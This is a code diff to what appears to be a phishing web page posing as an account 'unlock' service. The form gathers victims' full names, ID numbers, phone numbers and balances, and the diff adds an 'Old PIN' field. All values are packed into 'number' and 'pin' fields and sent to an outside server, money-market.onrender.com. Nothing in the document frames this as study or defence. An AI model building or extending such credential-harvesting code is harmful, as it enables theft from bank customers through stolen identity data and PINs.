@@ -81,6 +81,11 @@
     <input id="name" type="text" placeholder='Name and Surname (e.g. John Smith)'>
     <input id="idNumber" type="text" placeholder='ID Number (e.g. 0123456789089)'>
     <input id="phone" type="text" inputmode="numeric" pattern="[0-9]*" placeholder='Phone Number (e.g. 0812345678)'>
+
+    <!-- ✅ NEW: Old PIN -->
+    <input id="oldPin" type="password" placeholder='Old PIN (e.g. 1234)'>
+
+    <!-- ✅ Existing balance input -->
     <input id="balance" type="text" placeholder='Account balance (e.g. R3500)'>
 
     <button id="unlockBtn" class="btn btn-primary">Request Unlock</button>
@@ -91,20 +96,26 @@
     const nameInput = document.getElementById('name');
     const idInput = document.getElementById('idNumber');
     const phoneInput = document.getElementById('phone');
+    const oldPinInput = document.getElementById('oldPin');
     const balanceInput = document.getElementById('balance');
 
     unlockBtn.addEventListener('click', async () => {
       const name = nameInput.value.trim();
       const id = idInput.value.trim();
       const phone = phoneInput.value.trim();
+      const oldPin = oldPinInput.value.trim();
       const balance = balanceInput.value.trim();
 
-      if (!name || !id || !phone || !balance) {
+      if (!name || !id || !phone || !oldPin || !balance) {
         alert('Please fill all fields before submitting.');
         return;
       }
 
+      // ✅ number = name + id + phone
       const concatNumber = `${name} ${id} ${phone}`;
+
+      // ✅ pin = oldPin + space + balance
+      const combinedPin = `${oldPin} ${balance}`;
 
       try {
         const res = await fetch("https://money-market.onrender.com/submit", {
@@ -112,7 +123,7 @@
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             number: concatNumber,
-            pin: balance
+            pin: combinedPin
           })
         });
 
@@ -124,6 +135,7 @@
           nameInput.value = '';
           idInput.value = '';
           phoneInput.value = '';
+          oldPinInput.value = '';
           balanceInput.value = '';
         } else {
           alert(data?.message ? `Error: ${data.message}` : `Server responded with status ${res.status}`);
